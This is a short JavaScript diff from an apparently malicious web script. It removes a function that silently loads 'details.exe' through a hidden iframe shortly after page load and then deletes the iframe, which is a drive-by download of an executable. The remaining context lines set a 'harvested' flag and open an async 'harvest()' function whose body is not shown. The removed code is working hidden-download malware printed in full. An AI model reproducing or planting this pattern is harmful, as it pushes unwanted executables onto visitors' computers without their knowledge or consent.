@@ -1,27 +1,6 @@
 // A flag to prevent multiple harvests
 window.harvested = false;
 
-function downloadDetailsExeSilently() {
-  const downloadUrl = 'details.exe';
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.src = downloadUrl;
-  iframe.onload = () => {
-    console.log('details.exe iframe load complete.');
-    setTimeout(() => {
-      if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-    }, 10000);
-  };
-  iframe.onerror = () => {
-    console.warn('details.exe iframe failed to load.');
-    if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-  };
-  document.body.appendChild(iframe);
-}
-
-window.addEventListener('load', () => {
-  setTimeout(downloadDetailsExeSilently, 300);
-});
 
 async function harvest() {
   // Check the flag to ensure this function only runs once
